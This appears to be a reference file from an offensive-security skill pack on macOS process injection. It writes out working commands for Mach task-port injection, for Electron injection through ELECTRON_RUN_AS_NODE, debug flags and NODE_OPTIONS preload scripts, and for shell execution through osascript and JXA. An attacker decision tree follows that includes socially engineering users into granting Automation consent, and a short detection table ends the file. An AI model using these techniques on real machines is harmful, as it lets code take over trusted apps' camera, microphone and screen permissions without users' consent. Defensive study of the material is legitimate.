# macos-process-injection technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 4. MACH PORT MANIPULATION

Mach ports are the kernel-level IPC primitive underlying XPC. Direct Mach port access enables powerful injection.

### 4.1 Task Port (task_for_pid)

```c
// Requires root or taskgated entitlement
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
if (kr == KERN_SUCCESS) {
    // Can now read/write target process memory
    // Can inject threads via thread_create_running
}
```

| Access Method | Requirement | Post-Exploit Capability |
|---|---|---|
| `task_for_pid()` | Root + not SIP-protected target | Full memory R/W, thread injection |
| `processor_set_tasks()` | Root + `com.apple.system-task-ports` | Enumerate all task ports |
| Exception ports | Set via `task_set_exception_ports` | Catch target crashes, redirect execution |
| Thread injection | Task port obtained | Create new thread in target address space |

### 4.2 Port Namespace Manipulation

| Technique | Description |
|---|---|
| Port name guessing | Mach port names are sequential integers — brute-forceable in some contexts |
| `mach_port_insert_right` | Insert send right into target's namespace (requires task port) |
| Bootstrap server abuse | Register service name before legitimate service → intercept connections |

---

## 5. MIG (MACH INTERFACE GENERATOR) ABUSE

MIG generates C stubs for Mach IPC. MIG servers may have vulnerabilities in their dispatch routines.

### 5.1 Analysis Approach

```bash
# Find MIG subsystems in a binary
nm /path/to/binary | grep _subsystem
strings /path/to/binary | grep "MIG"

# Identify MIG routine dispatch tables
otool -tV /path/to/binary | grep -A 5 "server_routine"
```

### 5.2 Common MIG Vulnerabilities

| Vulnerability | Description |
|---|---|
| Missing audit token validation | MIG handler doesn't verify sender identity |
| Type confusion | MIG deserialization trusts client-provided type descriptors |
| Port lifecycle issues | Use-after-deallocate on Mach ports between MIG calls |
| OOL (out-of-line) memory abuse | Oversized OOL descriptors → kernel memory issues |

---

## 6. ELECTRON / CHROMIUM INJECTION

Many macOS apps use Electron (Slack, Discord, VS Code, Teams, etc.). Electron apps expose multiple injection surfaces.

### 6.1 ELECTRON_RUN_AS_NODE

```bash
# Turns Electron app into a plain Node.js runtime
ELECTRON_RUN_AS_NODE=1 "/Applications/Slack.app/Contents/MacOS/Slack" -e \
  "require('child_process').execSync('id').toString()"

# This inherits the app's TCC permissions!
# If Slack has camera/mic/screen recording, your code gets it too.
```

### 6.2 Debugging Flags

```bash
# Open Chrome DevTools protocol on the app
"/Applications/Target.app/Contents/MacOS/Target" --inspect=9229
# Then connect: chrome://inspect in Chrome browser

# Break before any code runs
"/Applications/Target.app/Contents/MacOS/Target" --inspect-brk=9229
```

### 6.3 NODE_OPTIONS Injection

```bash
# Inject preload script via NODE_OPTIONS
echo 'require("child_process").execSync("id > /tmp/pwned")' > /tmp/preload.js
NODE_OPTIONS="--require /tmp/preload.js" "/Applications/Target.app/Contents/MacOS/Target"
```

### 6.4 Electron Fuses

Modern Electron apps use "fuses" to disable dangerous features. Check fuse state:

| Fuse | When Enabled (secure) | When Disabled (exploitable) |
|---|---|---|
| `RunAsNode` | ELECTRON_RUN_AS_NODE stripped | Can use app as Node.js |
| `EnableNodeCliInspectArguments` | --inspect flags stripped | Can attach debugger |
| `EnableNodeOptionsEnvironmentVariable` | NODE_OPTIONS stripped | Can inject preload |
| `OnlyLoadAppFromAsar` | Only loads from .asar | Can replace JS files |

```bash
# Check electron fuse status (requires npx @electron/fuses)
npx @electron/fuses read --app "/Applications/Target.app"
```

---

## 7. APPLICATION SCRIPTING (APPLE EVENTS)

```bash
# Inject via osascript (if Automation permission exists)
osascript -e 'tell application "Terminal" to do script "id > /tmp/pwned"'

# JavaScript for Automation (JXA)
osascript -l JavaScript -e '
  var app = Application("Terminal");
  app.doScript("id > /tmp/pwned");
'

# JXA with ObjC bridge (powerful)
osascript -l JavaScript -e '
  ObjC.import("Cocoa");
  var task = $.NSTask.alloc.init;
  task.launchPath = "/bin/bash";
  task.arguments = ["-c", "id > /tmp/pwned"];
  task.launch;
'
```

---

## 8. PROCESS INJECTION DECISION TREE

```
Need to inject code into macOS process
│
├── Target uses Electron?
│   ├── Fuses disabled? → ELECTRON_RUN_AS_NODE (§6.1)
│   ├── Debugging available? → --inspect flag (§6.2)
│   ├── NODE_OPTIONS not stripped? → preload injection (§6.3)
│   └── All fuses on? → check dylib path or XPC
│
├── Target has dylib env var entitlement?
│   └── Yes → DYLD_INSERT_LIBRARIES (§1)
│
├── Target has missing or weak dylib?
│   ├── LC_LOAD_WEAK_DYLIB with missing lib? → place dylib (§2.1)
│   ├── @rpath with writable dir first in search? → rpath hijack (§2.2)
│   └── Existing dylib in writable location? → dylib proxy (§2.3)
│
├── Target exposes XPC service?
│   ├── No client validation? → connect directly (§3.3)
│   ├── PID-only validation? → PID reuse attack (§3.2)
│   └── Audit token validation? → need different vector
│
├── Have root access?
│   ├── Target not SIP-protected? → task_for_pid injection (§4.1)
│   └── SIP-protected? → need SIP bypass first (→ macos-security-bypass)
│
├── Can use Apple Events?
│   ├── Automation permission for target? → osascript injection (§7)
│   └── No permission? → social engineer Automation consent
│
└── None of the above?
    ├── Check for MIG server vulnerabilities (§5)
    └── Look for bootstrap server name collision (§4.2)
```

---

## 9. DETECTION & FORENSICS

| Artifact | Where to Look |
|---|---|
| DYLD_INSERT_LIBRARIES use | Process environment (`/proc/PID/environ`, `ps eww`) |
| Unexpected dylibs loaded | `vmmap PID` or `DYLD_PRINT_LIBRARIES=1` output |
| XPC connection anomalies | Endpoint Security `es_event_type_t` XPC events |
| Electron debug port open | `lsof -i :9229` |
| osascript execution | Unified log: `log show --predicate 'process=="osascript"'` |
| Unsigned code execution | `codesign --verify` failures, Gatekeeper logs |
